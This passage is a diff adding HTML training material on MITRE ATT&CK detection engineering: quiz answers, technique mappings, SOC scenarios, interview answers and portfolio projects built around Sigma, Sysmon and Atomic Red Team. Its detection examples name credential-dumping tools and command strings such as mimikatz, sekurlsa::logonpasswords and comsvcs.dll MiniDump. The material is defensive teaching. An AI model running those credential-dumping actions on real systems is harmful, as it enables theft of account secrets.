+c) 40+<br>
+d) 100+<br>
+<strong style="color:#00d4ff;">Answer: c) 40+</strong><br><br>
+
+<b>10. What is a "Procedure" in ATT&CK context?</b><br>
+a) The specific implementation of a technique used by a particular threat actor<br>
+b) The documented steps to install security tools<br>
+c) The regulatory compliance process<br>
+d) The SIEM configuration steps<br>
+<strong style="color:#00d4ff;">Answer: a) The specific implementation of a technique used by a particular threat actor</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Practical Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1.</b> Map the following attacker actions to ATT&CK technique IDs: (a) A user receives a phishing email with a malicious PDF, (b) The user opens the PDF, (c) JavaScript in the PDF runs PowerShell, (d) PowerShell encodes and executes a payload, (e) The payload dumps LSASS credentials, (f) Pass-the-hash is used to access a file server via SMB.<br>
+<strong style="color:#00d4ff;">Answer: (a) T1566.001 — Spearphishing Attachment, (b) T1204.002 — Malicious File, (c) T1059.007 — JavaScript, (d) T1059.001 — PowerShell, (e) T1003.001 — LSASS Memory, (f) T1550.002 — Pass the Hash + T1021.002 — SMB/Windows Admin Shares</strong><br><br>
+
+<b>2.</b> Your detection coverage heatmap shows "C2" tactic (TA0011) at 35% coverage. What techniques in this tactic should you prioritize writing rules for, considering 90% of malware uses HTTP/HTTPS for C2?<br>
+<strong style="color:#00d4ff;">Answer: Prioritize: (1) T1071.001 — Web Protocols (HTTP/HTTPS) — used by 90%+ of malware, (2) T1573.001 — Encrypted Channel (Symmetric) — covers encrypted C2, (3) T1095 — Non-Application Layer Protocol (TCP/UDP) — covers raw socket C2, (4) T1572 — Protocol Tunneling (DNS over HTTPS) — increasingly common. These four techniques cover the vast majority of C2 communications. After covering these, expand to: T1071.004 (DNS), T1090 (Proxy), T1205 (Port Knocking).</strong><br><br>
+
+<b>3.</b> You need to create a detection rule for T1055.012 (Process Hollowing). List the Windows Event IDs and Sysmon Event IDs you would need, and write a basic Sigma rule.<br>
+<strong style="color:#00d4ff;">Answer: Data sources needed: Sysmon EID 8 (CreateRemoteThread), Sysmon EID 1 (Process Creation with CREATE_SUSPENDED), Windows EID 4688 (Process Creation with command line). Basic Sigma rule: <code>title: Process Hollowing via CreateRemoteThread<br>
+logsource: product: windows, category: create_remote_thread<br>
+detection: selection: TargetImage|contains: '\svchost.exe', SourceImage|endswith: '\cmd.exe' OR '\powershell.exe'<br>
+condition: selection<br>
+level: high</code> Note: This is a basic example — in practice, you'd need to correlate multiple events and use behavioral baselines to reduce FPs.</strong><br><br>
+
+<b>4.</b> Your SOC manager asks: "Show me which APT techniques we can't detect." Walk through how you would answer this using ATT&CK tools.<br>
+<strong style="color:#00d4ff;">Answer: (1) Export all SIEM rules with ATT&CK tags to JSON, (2) Load into ATT&CK Navigator as a coverage layer (green = covered), (3) Go to the "Groups" tab and select the relevant APT group, (4) Use Navigator's "Group and Layer" analysis to overlay the APT's techniques on our coverage — the APT's techniques that appear red in our coverage are techniques we can't detect for that group, (5) Export this as a report showing: APT name, total techniques used by the APT (e.g., 45), techniques we cover (e.g., 22), techniques we don't cover (e.g., 23), (6) For the uncovered techniques, research: how common are they? How damaging? How hard to detect? (7) Present prioritized recommendations to close the gaps.</strong><br><br>
+
+<b>5.</b> Explain how you would use ATT&CK to create a "defense in depth" coverage approach where you have multiple detection layers for the same technique.<br>
+<strong style="color:#00d4ff;">Answer: Use layered detection across multiple data sources. Example — detecting T1003.001 (LSASS Memory / Mimikatz):<br>
+<em>Layer 1 — Process Access (Sysmon EID 10):</em> Alert when any non-system process opens a handle to lsass.exe with PROCESS_VM_READ access.<br>
+<em>Layer 2 — Process Creation (Sysmon EID 1):</em> Alert when mimikatz.exe or procdump64.exe is executed.<br>
+<em>Layer 3 — Command Line (Windows EID 4688):</em> Alert on command-line arguments containing methods like "sekurlsa::logonpasswords" or "comsvcs.dll" with "MiniDump".<br>
+<em>Layer 4 — File Monitoring (Sysmon EID 11):</em> Alert on file creation in temp directory with .dmp extension (dumped memory files).<br>
+<em>Layer 5 — Network (Zeek / Sysmon EID 3):</em> Alert when lsass.exe or a process that just accessed lsass makes an outbound connection (passing credentials over network).<br>
+By layering detections across 5 data sources, an attacker must evade ALL 5 to go undetected — much harder than evading a single rule. This is defense in depth applied to detection.</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Investigation Scenarios</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Scenario A — The Unseen Exfiltration:</b> Your ATT&CK coverage report shows you have excellent coverage for Credential Access (85%), Execution (78%), and Lateral Movement (72%). However, Exfiltration is at 15%. A sophisticated APT operates in your network for 9 months — they never trigger your credential or execution rules because they use different techniques. They use: (1) Initial Access — purchased valid credentials on dark web (T1078 — Valid Accounts), (2) Execution — used legitimate IT tools (LOLBins) (T1204.002 — Malicious File was not needed — they already had access), (3) C2 — used a legitimate cloud service (Microsoft Graph API) for C2 (T1102 — Web Service), (4) Exfiltration — uploaded sensitive data to cloud storage (T1567 — Exfiltration to Cloud Service). Your coverage heatmap showed these as "red" techniques but no one prioritized them because they didn't seem as common. What went wrong?<br>
+<strong style="color:#00d4ff;">Answer: The mistake was prioritizing coverage based on "common techniques" rather than "techniques that bypass current controls." The attacker specifically chose techniques your SOC didn't cover. Lesson: When building coverage, don't just look at what's most common — look at what techniques could bypass your existing controls. Also: threat actor-specific coverage matters — if you're a high-value target for APTs, prioritize techniques that APTs use (like T1078 — Valid Accounts, T1102 — Web Service C2) even if they're less common in general. Implement the "path of least resistance" analysis: for each detection gap, ask "if I were an attacker trying to avoid detection, would I use this technique?" If yes, prioritize it higher than frequency alone suggests.</strong><br><br>
+
+<b>Scenario B — The ATT&CK Evangelist:</b> You're the first SOC hire at a startup. The company has 500 employees, 1,000 endpoints, cloud-only infrastructure (AWS + O365). There's no SIEM, no detection rules, no incident response plan. The CISO asks you to implement MITRE ATT&CK. The development team says they're "too busy building features to worry about security." Where do you start?<br>
+<strong style="color:#00d4ff;">Answer: You need to be practical. Don't try to cover all 200+ techniques immediately. Focus on the "Common 20" — the techniques used in 80%+ of breaches. Start with: (1) Enable O365 audit logging and AWS CloudTrail (free data sources), (2) Deploy open-source SIEM (Wazuh) with basic detection rules for cloud environments, (3) Cover the highest-risk cloud-specific techniques: T1078 (Valid Accounts — detect unused accounts being used), T1110 (Brute Force — failed logins), T1525 (Implant Internal Image — detect rogue AMIs), T1530 (Data from Cloud Storage — detect S3 bucket access anomalies), (4) Set up automated alerting for critical detections (admin account used from unusual location, MFA disabled, unauthorized API calls), (5) Build a simple coverage heatmap showing these 20 techniques — demonstrate value to the development team with real alerts you catch, (6) Use non-technical metrics: "This month, ATT&CK-based monitoring detected and blocked 3 credential theft attempts that would have led to account takeover." Once the development team sees value, gradually expand coverage. Remember: small SOCs don't need full ATT&CK coverage — they need coverage for the techniques most likely to hurt them.</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Interview Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. "How would you use MITRE ATT&CK to build a detection program from scratch at a company with no existing security operations?"</b><br>
+<strong style="color:#00d4ff;">Answer: "I'd start with the 'Tactical 20' — the 20 most common ATT&CK techniques used in breaches (based on Verizon DBIR, CrowdStrike, and MITRE evaluations). These include: T1566 (Phishing), T1059 (Command & Scripting Interpreter), T1003 (OS Credential Dumping), T1486 (Data Encrypted — Ransomware), T1021 (Remote Services — RDP, SMB), T1053 (Scheduled Task), T1078 (Valid Accounts), T1110 (Brute Force), T1190 (Exploit Public-Facing Application), T1204 (User Execution). For each technique, I'd: (1) Identify the minimum log source needed (most are covered by Windows Event Log + Sysmon), (2) Write a Sigma rule, (3) Test with Atomic Red Team, (4) Deploy in monitor-only for 2 weeks, (5) Tune, then enable alerting. This gets us to ~40% coverage on day one. Then I'd run a quarterly exercise to expand coverage by 10-15% each quarter. The key is starting small and focused — not trying to boil the ocean."</strong><br><br>
+
+<b>2. "Explain the relationship between ATT&CK, Sigma rules, and Atomic Red Team in a detection engineering workflow."</b><br>
+<strong style="color:#00d4ff;">Answer: "These three form a complete detection engineering cycle. ATT&CK is the 'what' — it defines the adversary technique you need to detect. Sigma is the 'how' — the detection rule written in a SIEM-agnostic format. Atomic Red Team is the 'did it work' — the test that validates the rule actually detects the technique. The workflow: (1) Select a technique from ATT&CK (e.g., T1059.001 — PowerShell), (2) Research the technique page for detection guidance and data sources, (3) Write a Sigma rule that detects the technique, (4) Convert the Sigma rule to your SIEM format (Splunk/Elastic/KQL), (5) Execute the corresponding Atomic Red Team test, (6) Verify the SIEM alert fires, (7) If not, troubleshoot and fix the rule, (8) Record coverage status in ATT&CK Navigator. This creates a closed-loop system where every detection is defined (ATT&CK), expressed (Sigma), deployed (SIEM), and validated (ART)."</strong><br><br>
+
+<b>3. "What would you do if a CISO told you 'We have 100% ATT&CK coverage' based on what a vendor claimed?"</b><br>
+<strong style="color:#00d4ff;">Answer: "I'd respectfully challenge that claim. 100% ATT&CK coverage is not achievable — many techniques require data sources that no single organization has (kernel-level telemetry, hardware-level monitoring, etc.). I'd suggest we do a validation exercise: (1) Export all the vendor's claimed ATT&CK mappings, (2) Hand-pick 10 techniques the vendor claims to cover, (3) Test each one with Atomic Red Team in our actual environment with our actual logging, (4) I'd bet we'd find that several techniques don't generate alerts because: the required log source isn't configured, the data format is different than expected, or the rule is too broad/general to be useful. This isn't about proving the vendor wrong — it's about understanding our real detection posture. I'd recommend we replace the vendor claim with a self-validated coverage heatmap. Honest 40% coverage with validated detections is far better than claimed 100% coverage with no validation."</strong>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-briefcase me-2"></i>13. PORTFOLIO PROJECTS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Project: Personal ATT&CK Coverage Heatmap for Home Lab</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Create a personal ATT&CK coverage heatmap for your home lab environment. Deploy basic detection rules, test them with Atomic Red Team, build Navigator layer files, and track coverage improvement over time.<br><br>
+<b>Architecture:</b> Wazuh SIEM (home lab) → Windows VM with Sysmon → Custom detection rules → Coverage JSON → ATT&CK Navigator visualization.<br><br>
+<b>Tools:</b> Wazuh, Sysmon, Atomic Red Team, ATT&CK Navigator (web app), GitHub for rule storage.<br><br>
+<b>Steps:</b> (1) Deploy Wazuh with Windows agent and Sysmon, (2) Create 10 basic detection rules (brute force, PowerShell, Scheduled Task, Registry Run, LSASS access, RDP, Port Scan, USB connect, Shadow Copy deletion, C2 beaconing), (3) For each rule, identify the ATT&CK technique ID — add tags to your rules, (4) Export rules and their ATT&CK mappings, (5) Create Navigator JSON layer file with green for covered techniques, (6) Test each rule with Atomic Red Team — capture before/after screenshots, (7) Run a full coverage scan: execute Atomic Red Team tests for ALL techniques you have rules for — record which triggered alerts, (8) Identify gaps — which techniques do you need to add? (9) Iterate: add 5 new rules per week, update heatmap, track coverage increase, (10) Create a time-lapse of your coverage improvement over 4 weeks.<br><br>
+<b>Documentation:</b> Coverage evolution report showing: start coverage (e.g., 8%), improvement each week, final coverage (e.g., 35%). Navigator layer files for each week. Learned: which techniques were hardest to detect? Which had most FPs? Demonstrates: ATT&CK Navigator proficiency, detection rule creation, coverage measurement, systematic improvement.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Project: Threat Actor TTP Profile and Detection Plan</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Research a specific threat actor (e.g., APT29, Lazarus, FIN7, Wizard Spider), create a comprehensive TTP profile using ATT&CK, and build a detection plan covering their top techniques.<br><br>
+<b>Architecture:</b> Threat actor research → MITRE ATT&CK extraction → Detection rule writing → Coverage heatmap → Detection plan document.<br><br>
+<b>Tools:</b> MITRE ATT&CK website, Sigma CLI, Atomic Red Team, ATT&CK Navigator, text editor, GitHub.<br><br>
+<b>Steps:</b> (1) Select a threat actor — research their known campaigns, target industries, and tools, (2) Go to attack.mitre.org/groups/ — find the threat actor's page, (3) Extract all techniques listed — note any that are marked as "Systematically Used" (higher priority), (4) For the top 10-15 techniques, create detailed profiles:<br>
+   - Technique name, ID, tactic<br>
+   - How the actor specifically implements this technique (Procedure)<br>
+   - Required data sources<br>
+   - Existing detection rule (write new Sigma rule if none exists)<br>
+   - Detection validation plan (which Atomic test to run)<br>
+   - Mitigation recommendations<br>
+5. Write or collect Sigma rules for each of the 10-15 techniques<br>
+6. If you can test: execute the corresponding Atomic tests — validate detection<br>
+7. Create an ATT&CK Navigator layer specifically for this threat actor (show which of their techniques you can detect)<br>
+8. Write a comprehensive detection plan document: "How to Detect APT29 in Your Environment"<br>
+9. Create a playbook segment: "If you suspect APT29 activity, check these 10 specific techniques in this order"<br><br>
+<b>Documentation:</b> Threat Actor TTP Profile (15-20 pages): actor overview, attack chain with ATT&CK mapping, detection rules for each technique, testing results, coverage assessment, detection recommendations. Demonstrates: advanced ATT&CK knowledge, threat intelligence analysis, detection engineering, playbook creation, threat actor understanding.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Project: Automated SOC ATT&CK Coverage Reporting Platform</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build a fully automated platform that continuously tracks ATT&CK coverage, generates Navigator layers, runs periodic purple team tests, and provides executive dashboards on detection posture.<br><br>
+<b>Architecture:</b> SIEM API (Splunk/Elastic) → Python coverage analyzer → Elasticsearch coverage index → Grafana dashboard → ATT&CK Navigator layer exports → Automated purp' + 'le team via Atomic Red Team → Jira tickets for gaps.<br><br>
+<b>Tools:</b> Python, MITRE ATT&CK API (attack.mitre.org/api/), SIEM REST APIs, Grafana, Elasticsearch, GitHub Actions, Docker, Atomic Red Team.<br><br>
+<b>Steps:</b> (1) Build Python module <code>attack_coverage.py</code> with functions:<br>
+   - <code>fetch_siem_rules()</code> — pulls all rules from SIEM via API, extracts ATT&CK tags<br>
+   - <code>fetch_attack_matrix()</code> — pulls all techniques from MITRE ATT&CK API<br>
+   - <code>calculate_coverage()</code> — matches SIEM rules to ATT&CK techniques, generates coverage matrix<br>
+   - <code>generate_navigator_layer()</code> — outputs Navigator-compatible JSON with color coding<br>
+   - <code>run_purple_team()</code> — selects random sampling of uncovered techniques, runs ART tests, validates<br>
+   - <code>create_gap_tickets()</code> — creates Jira tickets for newly identified gaps<br>
+2. Build Flask API that exposes coverage data: <code>/api/coverage</code>, <code>/api/gaps</code>, <code>/api/navigator</code><br>
+3. Build Docker container with all dependencies, CI/CD pipeline for updates<br>
+4. Create Grafana dashboard showing:<br>
+   - Coverage % over time (sparkline with daily snapshots)<br>
+   - Coverage by tactic (bar chart showing green/yellow/red per tactic)<br>
+   - Top 5 uncovered techniques by risk score<br>
+   - Coverage trend: last 30 days, last quarter (up/down)<br>
+   - Purple team history: tests run, detection rate per run<br>
+   - Rules by status: enabled/disabled/test/monitor-only<br>
+5. Set up cron job: daily coverage recalculation, weekly Navigator layer export, monthly full purple team run<br>
+6. Implement alerting: if coverage drops by more than 5% in a week, notify SOC manager<br>
+7. Add MITRE ATT&CK API integration: track when new techniques are added to ATT&CK, create tickets to build rules for them<br>
+8. Build executive summary generator: auto-generate PDF with coverage metrics, improvement highlights, and gap analysis<br><br>
+<b>Documentation:</b> Full platform documentation: architecture diagram, API references, deployment guide (Docker, environment variables, API keys), user manual for SOC analysts, example reports. Demonstrates: full-stack security engineering, automation at scale, API integration across multiple platforms (SIEM, Jira, Grafana, MITRE), data-driven security operations, continuous improvement, executive reporting.
 </div>
 </div>
